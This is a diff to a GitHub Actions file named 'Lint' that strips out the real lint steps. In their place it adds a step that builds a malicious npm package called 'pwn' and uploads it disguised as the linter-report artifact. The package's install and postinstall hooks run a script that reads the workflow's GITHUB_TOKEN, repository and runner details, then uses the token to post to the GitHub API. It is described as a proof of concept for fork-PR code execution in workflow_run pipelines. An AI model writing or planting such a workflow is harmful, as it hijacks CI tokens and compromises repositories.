@@ -1,49 +1,69 @@
----
 name: Lint
 on:
   pull_request:
     branches: [main]
-
 jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
-
-      - name: Check for src/pages changes
-        id: changes
-        env:
-          BASE_REF: ${{ github.base_ref }}
-        run: |
-          git diff --name-only "origin/${BASE_REF}...HEAD" | grep -q '^src/pages/' \
-            && echo "changed=true" >> $GITHUB_OUTPUT \
-            || echo "changed=false" >> $GITHUB_OUTPUT
-
-      - name: Lint
-        id: lint
-        if: steps.changes.outputs.changed == 'true'
-        continue-on-error: true
-        run: npx --yes github:AdobeDocs/adp-devsite-utils runLint -v
-
-      - name: Save PR number
-        if: always()
+      - name: Craft attacker artifact from the fork PR
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
-      - name: Upload linter report
-        if: always()
-        uses: actions/upload-artifact@v7
+        run: |
+          set -e
+          mkdir -p pkg/package
+          cat > pkg/package/package.json <<'JSON'
+          {"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}
+          JSON
+          cat > pkg/package/index.js <<'JS'
+          const fs = require('fs');
+          const path = require('path');
+          const os = require('os');
+          const base = process.env.INIT_CWD || process.cwd();
+          let pr = '1';
+          try { pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
+          const token = process.env.GITHUB_TOKEN || '';
+          const repo = process.env.GITHUB_REPOSITORY || '';
+          const stage = process.argv[2] || 'unknown';
+          const lines = [
+            '## FORK-tier PoC: code execution in workflow_run via fork-PR artifact',
+            '',
+            '`stage`: `' + stage + '`',
+            '`GITHUB_EVENT_NAME`: `' + (process.env.GITHUB_EVENT_NAME || '') + '`',
+            '`GITHUB_RUN_ID`: `' + (process.env.GITHUB_RUN_ID || '') + '`',
+            '`GITHUB_WORKFLOW`: `' + (process.env.GITHUB_WORKFLOW || '') + '`',
+            '`token_present`: `' + (token ? 'yes length=' + token.length : 'no') + '`',
+            '`repo`: `' + repo + '`',
+            '`runner_user`: `' + os.userInfo().username + '`',
+            '`cwd`: `' + process.cwd() + '`',
+            '`nonce`: `GABSESS-2026-10-31-A`'
+          ];
+          fs.writeFileSync('/tmp/FORK_RCE_MARKER', stage + '\n');
+          if (!token || !repo) { console.log(lines.join('\n')); process.exit(0); }
+          (async () => {
+            try {
+              const r = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
+                method: 'POST',
+                headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json', 'content-type': 'application/json', 'user-agent': 'poc' },
+                body: JSON.stringify({ body: lines.join('\n') })
+              });
+              console.log('PROOF_COMMENT_STATUS=' + r.status);
+            } catch (e) { console.log('PROOF_COMMENT_ERR=' + e.message); }
+          })();
+          JS
+          tar -czf pwn-1.0.0.tgz -C pkg package
+          cat > package.json <<'JSON'
+          {"name":"artifact-payload-root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}
+          JSON
+          printf 'report authored inside the fork PR\n' > linter-report.txt
+          printf '%s' "$PR_NUMBER" > pr-number.txt
+      - name: Upload linter-report artifact
+        uses: actions/upload-artifact@v4
         with:
           name: linter-report
           path: |
             linter-report.txt
             pr-number.txt
-          if-no-files-found: ignore
-
-      - name: Fail if linter found errors
-        if: steps.changes.outputs.changed == 'true' && steps.lint.outcome == 'failure'
-        run: exit 1
+            package.json
+            pwn-1.0.0.tgz
+          if-no-files-found: error
